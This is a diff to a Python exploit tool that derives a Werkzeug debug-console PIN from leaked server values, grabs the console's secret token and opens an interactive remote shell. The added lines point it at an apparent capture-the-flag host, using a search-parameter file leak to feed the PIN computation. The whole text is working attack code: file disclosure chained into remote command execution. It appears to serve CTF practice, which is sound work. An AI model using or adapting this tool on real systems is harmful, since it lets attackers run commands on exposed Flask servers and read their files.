@@ -5,8 +5,8 @@ import hashlib
 from itertools import chain
 from bs4 import BeautifulSoup as bs
 
-def error(message=""):
-    print(f"[ERROR] {message}")
+def error(message="", prefix=""):
+    print(f"{prefix}[ERROR] {message}")
     exit(1)
 
 class WConsoleExtractorException(Exception):
@@ -73,7 +73,7 @@ class WConsoleExtractor:
         ]
 
         self.pin_code = WConsoleExtractor.compute_pin(self.probably_public_bits, self.private_bits)
-        self.token = self.get_token()
+        self.token = self.get_token(content)
 
 
     
@@ -181,9 +181,8 @@ class WConsoleExtractor:
 
         return rv
     
-    def get_token(self):
-        token_request = self.get("/console")
-        token = re.findall(r'SECRET = "(.+)";', token_request.text)
+    def get_token(self, token_request_content):
+        token = re.findall(r'SECRET = "(.+)";', token_request_content)
 
         if len(token) == 0:
             error("Error while finding token")
@@ -216,7 +215,25 @@ class WConsoleExtractor:
 
         while cmd not in exit_commands:
             pwd = self.exec_cmd("pwd")
-            self.print(f"{pwd}$ ")
-            cmd = self.input()
+            try:
+                self.print(f"{pwd}$ ")
+                cmd = self.input()
+            except KeyboardInterrupt:
+                error("Shell terminated", prefix="\n")
 
             self.print(f"{self.exec_cmd(cmd)}\n")
+
+import requests
+
+def leak_file(filename) -> str:
+    r = requests.get(f"https://chall-hosting.0xhorizon.eu/services?search={filename}")
+    soup = bs(r.text, 'html.parser')
+
+    return soup.find("center").contents[1].strip()
+
+extractor = WConsoleExtractor(
+    target="https://chall-hosting.0xhorizon.eu/console",
+    leak_function=leak_file
+)
+
+extractor.shell()
